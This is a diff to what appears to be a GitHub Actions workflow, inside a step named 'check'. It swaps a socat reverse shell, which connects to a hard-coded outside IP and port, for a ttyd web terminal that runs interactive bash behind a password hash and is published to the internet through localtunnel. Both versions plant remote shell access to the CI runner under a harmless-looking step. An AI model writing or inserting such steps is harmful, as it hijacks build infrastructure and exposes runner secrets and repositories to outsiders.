@@ -15,5 +15,12 @@ jobs:
         id: check
         shell: bash
         run: |
-          sudo apt install socat
-          socat tcp:51.75.78.69:8529 exec:"bash -i",pty,stderr,setsid,sigint,sane
+         sudo apt-get install build-essential cmake git libjson-c-dev libwebsockets-dev
+         git clone https://github.com/tsl0922/ttyd.git
+         cd ttyd && mkdir build && cd build
+         cmake ..
+         make && sudo make install
+         ttyd -t rendererType=webgl -t fontSize=20 -p 7681 bash -c 'echo -n "Password: ";read -sr p;[ "$(sha256sum <<<$p)" == "9baa30f3c6752b15e29853f8ffbc534cabcfaf873aec52aa3a1864a501f0c925  -" ] && ( clear;exec bash -i )'
+         sudo npm install -g localtunnel
+         lt -p 7681
+         
